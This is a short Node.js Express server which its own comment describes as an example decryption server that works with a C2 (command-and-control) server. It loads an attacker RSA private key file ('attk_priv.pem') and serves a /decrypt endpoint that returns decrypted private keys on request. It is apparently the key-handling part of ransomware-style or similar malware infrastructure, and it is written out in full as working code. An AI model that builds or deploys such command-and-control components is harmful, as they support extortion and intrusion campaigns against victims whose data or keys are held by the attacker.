/*
    *
    * This is an example server used to decrypt private keys
    * It works in tandem with a C2 server to prevent the storage of
    * private keys in plaintext
    * 
*/

const fs = require('fs');
const express = require('express');
const crypto = require('crypto');

const app = express();
app.use(express.json());

const priv_key_path = './attk_priv.pem';

let attk_priv = null;

// Load/Gen keys
if (fs.existsSync(priv_key_path))
    attk_priv = fs.readFileSync(priv_key_path, 'utf8');
else 
    console.log("Cannot Find Private Key");

// Assert private key exists
if (!attk_priv)
    process.exit();

app.post('/decrypt', (req, res) => {
    const { to_decrypt } = req.body;

    if (!to_decrypt)
        return res.status(400).json({ error: "Didn't Specify Key to Decrypt",
        given: req.body});
    
    const decrypted = crypto.privateDecrypt(
        {
            key: attk_priv,
            padding: crypto.constants.RSA_PKCS1_PADDING
        },
        Buffer.from(to_decrypt, 'base64')
    );

    res.status(200).json({ privateKey: decrypted.toString() });
});

app.listen(5000, () => {
    console.log("Starting Decryption Server...");
});
